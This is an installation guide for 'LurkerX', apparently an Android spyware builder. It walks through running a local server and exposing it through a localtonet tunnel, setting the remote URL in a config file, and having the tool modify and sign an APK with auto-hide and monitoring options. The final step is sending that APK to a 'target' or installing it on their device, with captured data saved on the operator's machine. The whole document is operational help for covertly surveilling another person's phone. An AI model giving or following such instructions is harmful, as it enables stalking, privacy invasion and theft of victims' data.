## LurkerX Installation Guide

This guide provides basic step-by-step instructions on how to use LurkerX

## How to Remotely Receive Captured data (Basic default option)
### First edit the choices.ini to your preferences

1. Launch *server.exe* and leave it running unless you wanna stop the server.
2. Open your browser and create account on <a href="https://localtonet.com">LOCALTONET</a>.
3. Expand the menu and create an HTTP forwarder
4. Set PORT to <b>5000</b>, HOST to <b>127.0.0.1</b> or <b>localhost</b>
5. Save and copy your Authentication token (Auth Token)
6. Download localtonet.exe or binary for linux using <a href=https://localtonet.com/download"">THIS LINK</a>.
7. Choose the bit suitable for your system(Commonly 64-bit) and download
8. Open the downloaded localtonet.exe or binary on your machine(This will make your PC act as a public server)
9. Paste authentication token and leave it running
10. Copy the URL shown in the localtonet running
11. Open choices.ini, find *remoteUrl* and replace its value with the one you have copied
12. Launch lurkerx.exe or lurkerx binary and wait for it to finish modifying the APK.
13. Send the aligned APK to your target or install it on target device and launch the app.
### All captured packets would be saved in your Documents folder

# Understand the Config

### mykey.jks
Default keystore file for signing APK after modification
### choices.ini
This file stores your prefernce app details(name, icon), and behaviour(auto-hide, monitoring capabilities and features).

## Additional Notes

- If you encounter any errors, please refer to the LurkerX documentation or seek assistance from the community.
- This guide assumes you have basic knowledge of using the command line.
